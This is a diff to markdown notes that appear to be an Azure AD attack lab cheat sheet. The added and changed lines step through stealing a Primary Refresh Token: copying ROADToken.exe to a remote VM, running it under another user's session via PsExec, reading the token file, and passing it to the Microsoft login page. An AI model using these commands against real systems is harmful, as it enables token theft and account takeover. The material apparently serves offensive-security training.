@@ -476,6 +476,8 @@ $Result.Nonce
 Copy-Item -ToSession $TargetVM -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\ProgramData\ –Verbose 
 ```
 
+Enter session- ```Enter-PSSession -Session $TargetVM```
+
 Run scripts as user who possesses the PRT: 
 ```
 Invoke-Command -Session $infradminsrv -ScriptBlock{C:\ProgramData\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\ProgramData\SessionExecCommand.exe MichaelMBarron C:\ProgramData\ROADToken.exe <nonce> > C:\ProgramData\PRT.txt"}
@@ -483,7 +485,7 @@ Invoke-Command -Session $infradminsrv -ScriptBlock{C:\ProgramData\PsExec64.exe -
 
 Show PRT:
 ```
-Invoke-Command -Session $infradminsrv -ScriptBlock{cat C:\Users\Public\student213\PRT.txt}
+Invoke-Command -Session $infradminsrv -ScriptBlock{cat C:\ProgramData\PRT.txt}
 ```
 #### Pass PRT
 - goto ```https://login.microsoftonline.com/login.srf``` in incognito browser
